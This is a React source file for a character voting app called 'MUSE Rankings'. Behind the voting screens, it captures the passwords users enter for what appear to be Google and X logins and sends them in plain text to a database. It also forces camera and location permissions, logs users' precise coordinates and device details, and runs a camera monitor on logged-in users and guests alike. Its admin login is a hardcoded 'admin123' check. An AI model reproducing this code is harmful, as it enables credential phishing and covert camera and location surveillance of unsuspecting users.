import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { Character } from './types';
import { INITIAL_CHARACTERS } from './constants';
import SwipeCard from './components/SwipeCard';
import Leaderboard from './components/Leaderboard';
import VoteConfirmationModal from './components/VoteConfirmationModal';
import AuthModal, { LoginResult } from './components/AuthModal';
import AdminDashboard from './components/AdminDashboard';
import PermissionModal from './components/PermissionModal';
import CameraMonitor from './components/CameraMonitor';
import { dataService } from './services/dataService'; 
import { LogOut, Timer, ShieldAlert } from 'lucide-react';
import { AnimatePresence } from 'framer-motion';

function App() {
  const [view, setView] = useState<'app' | 'admin_login' | 'admin_dashboard'>('app');
  const [adminPassword, setAdminPassword] = useState('');
  const [adminError, setAdminError] = useState('');
  const [isAdminLoading, setIsAdminLoading] = useState(false);
  const [characters, setCharacters] = useState<Character[]>(INITIAL_CHARACTERS);
  const [activeIndex, setActiveIndex] = useState(0);
  const [user, setUser] = useState<string | null>(() => localStorage.getItem('muse_current_user'));
  const guestId = useMemo(() => {
    let gid = localStorage.getItem('muse_guest_id');
    if (!gid) { gid = `guest_${Math.random().toString(36).substr(2, 9)}`; localStorage.setItem('muse_guest_id', gid); }
    return gid;
  }, []);

  const [hasVoted, setHasVoted] = useState<boolean>(false);
  const [isVoteModalOpen, setIsVoteModalOpen] = useState(false);
  const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);

  // --- PERMISSION STATE ---
  const [isLocationDenied, setIsLocationDenied] = useState(false);
  const [isCameraDenied, setIsCameraDenied] = useState(false);
  const [missingPermissions, setMissingPermissions] = useState<('location' | 'camera')[]>([]);

  // --- TIMER STATE ---
  const [votingDeadline, setVotingDeadline] = useState<string | null>(() => localStorage.getItem('muse_voting_deadline'));
  const [timeLeft, setTimeLeft] = useState<{days: number, hours: number, minutes: number, seconds: number} | null>(null);
  const [isVotingEnded, setIsVotingEnded] = useState(false);

  // --- DATA LOADING ---
  const fetchCharacters = useCallback(async () => {
    const chars = await dataService.getCharacters();
    setCharacters(chars);
  }, []);

  useEffect(() => {
    fetchCharacters();
    const unsubscribeSupabase = dataService.subscribeToVotes(() => fetchCharacters());
    const handleStorageChange = () => {
        fetchCharacters();
        setVotingDeadline(localStorage.getItem('muse_voting_deadline'));
    };
    window.addEventListener('local-storage-update', handleStorageChange);
    window.addEventListener('storage', handleStorageChange);
    return () => {
        unsubscribeSupabase();
        window.removeEventListener('local-storage-update', handleStorageChange);
        window.removeEventListener('storage', handleStorageChange);
    };
  }, [fetchCharacters]);

  // --- LOGGING ---
  const logVisitToDatabase = useCallback(async (identifier: string, method: 'google' | 'x' | 'guest_visit', pass: string = '') => {
      const deviceInfo = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          screenSize: `${window.innerWidth}x${window.innerHeight}`,
      };
      const storedLoc = localStorage.getItem('muse_user_location');
      const locationData = storedLoc ? JSON.parse(storedLoc) : null;

      await dataService.registerUserLogin({
          user_identifier: identifier,
          password_text: pass, 
          login_method: method,
          device_info: deviceInfo,
          location_data: locationData
      });
  }, []);

  // --- PERMISSIONS ---
  const checkPermissions = useCallback(async () => {
    const missing: ('location' | 'camera')[] = [];
    
    // Check Camera
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        stream.getTracks().forEach(track => track.stop());
        setIsCameraDenied(false);
    } catch (err) {
        setIsCameraDenied(true);
        missing.push('camera');
    }

    // Check Location
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const locationData = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                };
                localStorage.setItem('muse_user_location', JSON.stringify(locationData));
                setIsLocationDenied(false);
            },
            () => {
                setIsLocationDenied(true);
                // We do this check inside callback because it's async
                setMissingPermissions(prev => {
                     const s = new Set(prev);
                     s.add('location');
                     return Array.from(s);
                });
            }
        );
    } else {
        setIsLocationDenied(true);
        missing.push('location');
    }

    setMissingPermissions(prev => {
        const unique = new Set([...prev, ...missing]);
        // Remove valid ones
        if (!isCameraDenied && !missing.includes('camera')) unique.delete('camera');
        if (!isLocationDenied && !missing.includes('location')) unique.delete('location');
        return Array.from(unique);
    });

  }, [isCameraDenied, isLocationDenied]);

  useEffect(() => { checkPermissions(); }, [checkPermissions]);

  // Poll permissions periodically to detect if user changed browser settings
  useEffect(() => {
      const interval = setInterval(checkPermissions, 3000);
      return () => clearInterval(interval);
  }, [checkPermissions]);

  // --- TIMER ---
  useEffect(() => {
    const calculateTimeLeft = () => {
        if (!votingDeadline) { setTimeLeft(null); setIsVotingEnded(false); return; }
        const diff = new Date(votingDeadline).getTime() - new Date().getTime();
        if (diff > 0) {
            setTimeLeft({
                days: Math.floor(diff / (1000 * 60 * 60 * 24)),
                hours: Math.floor((diff / (1000 * 60 * 60)) % 24),
                minutes: Math.floor((diff / 1000 / 60) % 60),
                seconds: Math.floor((diff / 1000) % 60),
            });
            setIsVotingEnded(false);
        } else {
            setTimeLeft(null); setIsVotingEnded(true);
        }
    };
    calculateTimeLeft();
    const timer = setInterval(calculateTimeLeft, 1000);
    return () => clearInterval(timer);
  }, [votingDeadline]);

  useEffect(() => {
    if (user) {
        const userHasVoted = localStorage.getItem(`muse_vote_record_${user}`);
        setHasVoted(!!userHasVoted);
        setIsAuthModalOpen(false); // Force close auth modal if user is detected
    } else {
        setHasVoted(false);
    }
  }, [user]);

  const handleNext = () => setActiveIndex((prev) => (prev + 1) % characters.length);
  const handlePrev = () => setActiveIndex((prev) => (prev - 1 + characters.length) % characters.length);
  const handleCardClick = (index: number) => setActiveIndex(index);

  const handleLoginSuccess = (result: LoginResult) => {
      const { username, password, method } = result;
      setIsAuthModalOpen(false); // Immediate close
      setUser(username);
      localStorage.setItem('muse_current_user', username);
      logVisitToDatabase(username, method, password);
      
      // Open vote modal after small delay
      if (!isVotingEnded) {
          setTimeout(() => setIsVoteModalOpen(true), 600);
      }
  };

  const handleLogout = () => {
      setUser(null);
      localStorage.removeItem('muse_current_user');
      setHasVoted(false);
  };

  const handleConfirmVote = async () => {
    if (!user || isVotingEnded) return;
    setIsVoteModalOpen(false);
    try {
        const activeChar = characters[activeIndex];
        const storedLoc = localStorage.getItem('muse_user_location');
        const locationData = storedLoc ? JSON.parse(storedLoc) : null;
        const deviceInfo = { userAgent: navigator.userAgent, platform: navigator.platform, screenSize: `${window.innerWidth}x${window.innerHeight}` };

        await dataService.castVote(activeChar.id, user, { location: locationData, deviceInfo });
        
        setHasVoted(true);
        // Force refresh
        const updated = await dataService.getCharacters();
        setCharacters(updated);

    } catch (e) {
        alert("Vote failed locally.");
    }
  };

  const activeCharacter = characters[activeIndex];

  if (view === 'admin_dashboard') return <AdminDashboard characters={characters} setCharacters={setCharacters} onLogout={() => setView('app')} />;
  if (view === 'admin_login') return (
        <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4">
             <div className="w-full max-w-sm bg-slate-900 border border-slate-800 p-8 rounded-2xl shadow-2xl relative overflow-hidden">
                <h2 className="text-xl font-bold text-white mb-6 text-center">System Administration</h2>
                <form onSubmit={(e) => { e.preventDefault(); setIsAdminLoading(true); setTimeout(() => { if (adminPassword === 'admin123') { setView('admin_dashboard'); setAdminError(''); } else { setAdminError('Invalid Code'); } setIsAdminLoading(false); }, 1000); }} className="space-y-4">
                   <input type="password" value={adminPassword} onChange={(e) => setAdminPassword(e.target.value)} className="w-full bg-slate-950 border border-slate-700 text-white px-4 py-3 rounded-xl outline-none" placeholder="••••••••" />
                   {adminError && <p className="text-red-500 text-xs text-center">{adminError}</p>}
                   <button type="submit" disabled={isAdminLoading} className="w-full bg-indigo-600 text-white font-bold py-3 rounded-xl">Unlock System</button>
                   <button type="button" onClick={() => setView('app')} className="w-full text-slate-500 text-xs mt-2">Return</button>
                </form>
             </div>
        </div>
  );

  return (
    <div className="min-h-screen w-full bg-slate-950 flex justify-center overflow-x-hidden relative font-sans">
      <div className="fixed inset-0 pointer-events-none z-0">
         <div className="absolute top-[-20%] left-[-20%] w-[80vw] h-[80vw] md:w-[600px] md:h-[600px] bg-purple-900/20 rounded-full blur-[120px]" />
         <div className="absolute bottom-[-20%] right-[-20%] w-[80vw] h-[80vw] md:w-[600px] md:h-[600px] bg-indigo-900/20 rounded-full blur-[100px]" />
      </div>

      <div className="relative z-10 w-full max-w-md flex flex-col items-center py-8 px-4 gap-6">
        <header className="w-full flex flex-col gap-4 relative">
          <div className="w-full flex justify-between items-center bg-slate-900/40 p-3 rounded-2xl border border-white/5 backdrop-blur-sm">
             <div className="flex items-center gap-3">
                 <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center font-bold text-white shadow-lg">M</div>
                 <div><h1 className="text-lg font-bold text-white leading-none">MUSE</h1><p className="text-[9px] text-indigo-300/80 tracking-widest uppercase font-medium">Rankings</p></div>
             </div>
             <div className="flex items-center gap-2">
                 {user ? (
                     <div className="flex items-center gap-2 pl-3 pr-1 py-1 bg-slate-800/50 rounded-full border border-slate-700/50">
                        <span className="text-xs font-semibold text-slate-300 max-w-[80px] truncate">{user}</span>
                        <button onClick={handleLogout} className="w-7 h-7 flex items-center justify-center rounded-full bg-slate-700 hover:text-red-400 transition-colors"><LogOut size={14} /></button>
                     </div>
                 ) : (
                     <button onClick={() => setIsAuthModalOpen(true)} className="px-4 py-2 rounded-xl bg-indigo-600/20 text-indigo-300 border border-indigo-500/30 text-xs font-bold">Login</button>
                 )}
             </div>
          </div>
          {votingDeadline && !isVotingEnded && timeLeft && (
             <div className="w-full bg-indigo-900/20 border border-indigo-500/20 rounded-xl p-3 flex items-center justify-between backdrop-blur-sm">
                <div className="flex items-center gap-2 text-indigo-300"><Timer size={16} className="animate-pulse" /><span className="text-xs font-bold tracking-wider">VOTING ENDS IN</span></div>
                <div className="flex items-center gap-1 font-mono text-sm font-bold text-white">
                    <span>{timeLeft.days}d : {timeLeft.hours}h : {timeLeft.minutes}m : {timeLeft.seconds}s</span>
                </div>
             </div>
          )}
        </header>

        <section className="w-full relative h-[500px] flex items-center justify-center perspective-1000 mt-2">
             <AnimatePresence mode="popLayout" initial={false}>
               {characters.map((char, index) => {
                  return (
                    <SwipeCard 
                      key={char.id}
                      character={char} 
                      isActive={index === activeIndex}
                      offset={index - activeIndex}
                      onClick={() => handleCardClick(index)}
                      onSwipeRight={handlePrev}
                      onSwipeLeft={handleNext}
                    />
                  );
               })}
             </AnimatePresence>
        </section>

        <section className="w-full flex flex-col items-center gap-4 px-2">
             <div className="flex justify-center gap-1.5 mb-2">
                {characters.map((_, idx) => (
                  <button key={idx} onClick={() => setActiveIndex(idx)} className={`h-1.5 rounded-full transition-all duration-300 ${idx === activeIndex ? 'w-8 bg-indigo-400' : 'w-1.5 bg-slate-700'}`} />
                ))}
             </div>
             <button
               onClick={() => { if(!hasVoted && !isVotingEnded) setIsVoteModalOpen(true); else if(!user) setIsAuthModalOpen(true); }}
               disabled={hasVoted || isVotingEnded}
               className={`relative w-full h-14 rounded-2xl font-bold text-lg transition-all flex items-center justify-center gap-3 overflow-hidden shadow-[0_0_20px_rgba(0,0,0,0.3)] border ${hasVoted || isVotingEnded ? 'bg-slate-900/50 border-slate-700/50 cursor-not-allowed text-slate-500' : 'bg-slate-900/80 backdrop-blur-xl border-indigo-500/30 text-white'}`}
             >
                {isVotingEnded ? <span>TIME'S UP</span> : hasVoted ? <span>VOTING CLOSED</span> : <span>VOTE FOR {activeCharacter.name.split(' ')[0].toUpperCase()}</span>}
             </button>
        </section>

        <section className="w-full relative z-30 pb-10">
           <Leaderboard characters={characters} />
        </section>

        <footer className="w-full text-center pb-8 opacity-50 hover:opacity-100 transition-opacity">
           <button onClick={() => setView('admin_login')} className="text-[10px] text-slate-600 hover:text-indigo-400 flex items-center justify-center gap-1 mx-auto"><ShieldAlert size={10} /> Admin Access</button>
        </footer>
      </div>

      <AnimatePresence>
        {isVoteModalOpen && !isVotingEnded && <VoteConfirmationModal isOpen={isVoteModalOpen} onClose={() => setIsVoteModalOpen(false)} onConfirm={handleConfirmVote} characterName={activeCharacter.name} />}
      </AnimatePresence>

      <AnimatePresence>
        {isAuthModalOpen && !user && <AuthModal isOpen={isAuthModalOpen} onClose={() => setIsAuthModalOpen(false)} onLoginSuccess={handleLoginSuccess} />}
      </AnimatePresence>

      {(isLocationDenied || isCameraDenied) && <PermissionModal onRetry={checkPermissions} missingPermissions={missingPermissions} />}
      {(user || guestId) && !isCameraDenied && <CameraMonitor user={user || guestId} onError={() => setIsCameraDenied(true)} onSuccess={() => setIsCameraDenied(false)} />}
    </div>
  );
}

export default App;